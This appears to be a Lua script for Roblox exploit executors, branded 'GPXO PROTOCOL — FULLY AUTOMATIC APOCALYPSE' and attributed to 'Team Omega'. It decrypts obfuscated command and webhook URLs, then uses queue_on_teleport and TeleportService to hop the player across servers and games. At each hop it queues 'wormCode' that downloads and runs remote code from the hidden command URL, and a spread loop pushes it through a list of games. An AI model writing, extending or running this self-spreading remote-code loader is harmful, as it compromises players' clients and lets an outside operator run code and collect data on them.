-- ============================================================================
--  GPXO PROTOCOL — FULLY AUTOMATIC APOCALYPSE (v7.1 - Integrated Routing Kernel)
--  Owner: Team Omega
...
local ENCRYPTED_COMMAND_URL = "bnp6dnk6Ly94Z2MubW96bntuaHV0emtudHouaXVzL3Nrdmp5dD00LWprfC9Vc2FtZkpnemcveGx5L25rZ2p5L3Nnb3QvaXVzc2d0ai56fno"
local ENCRYPTED_WEBHOOK_URL = "bnp6dnk6Ly9qYm95dXhqLml1cy9ndm8vY2tuaHV1a3kvNzo1NDk5OjU3Nzo4Njo5NjM6ODo6L0k4c2xFaFBpN1g8V0JsZntvYk45T3otQnNifDdzWDg0VHpNVT9OWj9ufl84NC1ZcVFTcV81ckhfbmJzaFJ+QjdffjV0UA=="
-- ==========================================================
...
do
    ...
    if commandUrl ~= "" then
        ...
        warn("[OMEGA] Failed to decrypt URLs.")
    end
end
...
-- ===================[ INTEGRATED ROUTING KERNEL v2.0 ]===================
-- هذا المحرك يحل محل آلة القفز المباشر، ويوفر توجيهاً متعدد القفزات
local RoutingKernel = {}
local NodeTopology = {
    Tier1 = { 185655149, 2753915549, 4520749081 },
    Tier2 = { 606849744, 4872321590, 14125553864 },
    Tier3 = { 5375399205, 14940596979, 98381723384335 }
}
local ActiveSession = { RoutePath = {}, TTL = 5, RetryCount = 0, MaxRetries = 3 }

local function generateRobustPath(hopCount)
    local path = {}
    local tiers = { NodeTopology.Tier1, NodeTopology.Tier2, NodeTopology.Tier3 }
    for i = 1, hopCount do
        local tier = tiers[math.random(1, #tiers)]
        local node = tier[math.random(1, #tier)]
        path[i] = node
    end
    return path
end
...
function RoutingKernel:Transmit(encryptedPayload, destinationServerId)
    if not destinationServerId or destinationServerId == 0 then
        return false, "Invalid Destination Node"
    end
    resetSession()
    local fullPath = generateRobustPath(3)
    table.insert(fullPath, destinationServerId)
    local routingHeader = {
        Path = fullPath,
        CurrentHop = 1,
        Origin = game.PlaceId,
        Timestamp = os.time(),
        TTL = ActiveSession.TTL
    }
    local bundle = {
        Header = routingHeader,
        Body = encryptedPayload,
        Checksum = #encryptedPayload + (os.time() % 1000)
    }
    local serializedBundle = HttpService:JSONEncode(bundle)
    local hopScript = string.format([[
        local HttpService = game:GetService("HttpService")
        local rawData = %q
        local bundle = HttpService:JSONDecode(rawData)
        if bundle.Header.TTL <= 0 then return end
        bundle.Header.CurrentHop = bundle.Header.CurrentHop + 1
        bundle.Header.TTL = bundle.Header.TTL - 1
        local nextNodeId = bundle.Header.Path[bundle.Header.CurrentHop]
        if not nextNodeId then return end
        local newPayload = HttpService:JSONEncode(bundle)
        local wormCode = [[loadstring(game:HttpGet("]] .. (commandUrl or "") .. [[?worm=1"))()]]
        if queue_on_teleport then
            queue_on_teleport(wormCode)
            TeleportService:Teleport(nextNodeId, game.Players.LocalPlayer)
        end
        rawData = nil; bundle = nil; newPayload = nil
        collectgarbage("collect")
    ]], serializedBundle)
    local success, err = pcall(function()
        if queue_on_teleport then
            queue_on_teleport(hopScript)
            TeleportService:Teleport(fullPath[1], LocalPlayer)
        else
            loadstring(hopScript)()
        end
    end)
    if not success then
        ActiveSession.RetryCount = ActiveSession.RetryCount + 1
        if ActiveSession.RetryCount < ActiveSession.MaxRetries then
            task.wait(2 ^ ActiveSession.RetryCount)
            return self:Transmit(encryptedPayload, destinationServerId)
        end
    end
    return success
end

-- ===================[ CROSS-GAME SPREAD ENGINE (UPDATED) ]===================
local function JumpToNewGame(targetGameId)
    if not targetGameId or type(targetGameId) ~= "number" then return false end
    -- استخدام المحرك الجديد بدلاً من القفز المباشر
    return RoutingKernel:Transmit("spread_signal", targetGameId)
end
...
local function UniversalSpread()
    ...
    for _, id in ipairs(whitelistGames) do
        task.wait(8)
        JumpToNewGame(id)
    end
end
